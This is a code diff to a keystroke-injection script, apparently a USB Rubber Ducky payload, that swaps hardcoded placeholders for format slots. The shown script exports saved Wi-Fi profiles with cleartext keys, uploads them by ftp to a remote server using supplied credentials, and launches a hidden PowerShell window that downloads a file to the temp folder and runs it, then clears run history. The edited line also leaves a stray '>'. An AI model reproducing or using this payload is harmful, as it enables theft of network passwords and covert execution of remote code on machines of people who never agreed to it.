@@ -39,13 +39,13 @@ DELAY 400
 STRING netsh wlan export profile key=clear
 ENTER
 DELAY 400
-STRING ftp <SERVICE_HOST>
+STRING ftp {0}
 ENTER
 DELAY 400
-STRING <USERNAME>
+STRING {1}
 ENTER
 DELAY 400
-STRING <PASSWORD>
+STRING {2}
 ENTER
 DELAY 1000
 STRING prompt
@@ -68,7 +68,7 @@ REM
 DELAY 500
 GUI R
 DELAY 200
-STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('<http://URL/TO/FILE.EXT>', '%TEMP%\<OUTPUT_FILE.EXT>'); Start-Process "%TEMP%\<OUTPUT_FILE.EXT>"
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('{3}', '%TEMP%\{4}'); Start-Process "%TEMP%\{4}>"
 ENTER
 REM
 REM CLEAR THE RUN HISTORY
